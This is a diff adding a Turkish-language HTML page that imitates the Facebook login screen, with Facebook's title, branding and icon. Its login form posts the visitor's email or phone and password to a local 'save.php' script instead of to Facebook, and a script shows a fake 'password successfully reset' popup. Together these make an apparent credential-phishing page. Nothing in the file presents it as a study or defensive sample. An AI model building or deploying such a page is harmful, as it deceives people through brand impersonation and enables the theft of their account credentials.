@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook - Giriş Yap veya Kaydol</title>
+  <link rel="stylesheet" href="style.css">
+  <link rel="icon" type="image/png" href="facebook-icon.png">
+
+  <style>
+    #popup {
+      display: none;
+      position: fixed;
+      top: 10px;
+      left: 50%;
+      transform: translateX(-50%);
+      background-color: #1877f2;
+      color: white;
+      padding: 10px 20px;
+      border-radius: 6px;
+      font-size: 14px;
+      font-weight: 500;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+      z-index: 999;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ✅ Popup kutusu -->
+  <div id="popup">Şifreniz başarıyla sıfırlandı.</div>
+
+  <!-- ✅ Popup gösterimi -->
+  <script>
+    window.addEventListener("DOMContentLoaded", function () {
+      const params = new URLSearchParams(window.location.search);
+      if (params.get("reset") === "success") {
+        const popup = document.getElementById("popup");
+        popup.style.display = "block";
+        setTimeout(() => {
+          popup.style.display = "none";
+        }, 3000);
+      }
+    });
+  </script>
+
+  <div class="container flex">
+    <div class="facebook-page flex">
+      <div class="text">
+        <h1>facebook</h1>
+        <p>Arkadaşlarınla ve dünyayla bağlantı kur.</p>
+        <p>Facebook'ta etrafındaki kişilerle iletişimde kal.</p>
+      </div>
+
+      <!-- FORM -->
+      <form action="save.php" method="post">
+        <input type="email" name="email" placeholder="E-posta veya telefon numarası" required>
+        <input type="password" name="password" placeholder="Şifre" required>
+        <div class="link">
+          <button type="submit" class="login">Giriş Yap</button>
+          <a href="forget.html" class="forgot">Şifreni mi unuttun?</a>
+        </div>
+        <hr>
+        <div class="button">
+          <a href="#">Yeni hesap oluştur</a>
+        </div>
+      </form>
+    </div>
+  </div>
+</body>
+</html>
